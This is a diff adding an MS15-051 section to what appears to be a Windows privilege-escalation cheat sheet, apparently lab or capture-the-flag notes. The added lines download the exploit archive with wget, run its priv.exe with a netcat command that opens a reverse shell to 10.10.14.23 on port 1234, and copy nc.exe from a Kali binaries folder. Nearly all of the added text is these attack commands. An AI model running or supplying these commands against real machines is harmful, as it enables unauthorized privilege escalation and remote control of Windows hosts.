@@ -580,7 +580,18 @@ https://github.com/SecWiki/windows-kernel-exploits/raw/master/win-exp-suggester/
     https://github.com/SecWiki/windows-kernel-exploits
 
 
+## MS15-051
 
+```
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+MS15-051-KB3045171
+
+wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
+Exploit
+/priv.exe "c:\windows\temp\nc.exe -e cmd 10.10.14.23 1234"
+
+cp  /usr/share/windows-binaries/nc.exe .
+```
 
 
 ## Exploit suggester
